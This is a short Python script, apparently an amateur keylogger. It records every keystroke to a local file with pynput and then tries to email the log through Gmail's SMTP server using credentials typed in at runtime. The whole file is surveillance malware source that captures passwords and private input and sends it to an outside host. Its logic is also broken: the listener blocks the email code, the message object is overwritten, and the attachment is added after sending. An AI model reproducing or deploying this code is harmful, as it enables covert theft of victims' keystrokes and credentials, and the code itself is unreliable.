from pynput.keyboard import Key, Listener
import logging
import smtplib
from email import message
from os.path import basename
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

log_dir = ""

logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()

# Send email stuff(hopefully)
email = input(str("Enter you email please: "))
to_addr = input(str("Select the email you want to send it to: "))
password = input(str("Enter you password for your email please: "))

from_addr = email
#to_addr = password
subject = 'Keylogger working?'
body = 'It actually might have!'
content = 'How neat is that?'
msg = MIMEMultipart()
msg['From'] = from_addr
msg['To'] = to_addr
msg['Subject'] = subject
body = MIMEText(content, 'plain')
msg = message.Message()
msg.add_header('from', from_addr)
msg.add_header('to', to_addr)
msg.add_header('subject', subject)
msg.set_payload(body)
server = smtplib.SMTP('smtp.gmail.com',587)
server.starttls()
server.login(from_addr, password)
server.send_message(msg, from_addr=from_addr, to_addrs=[to_addr])
filename = 'keylogs.txt'
with open(filename, 'r') as f:
    part = MIMEApplication(f.read(), Name=basename(filename))
    part['Content-Disposition'] = 'attachment; filename="{}"'.format(basename(filename))
msg.attach(part)
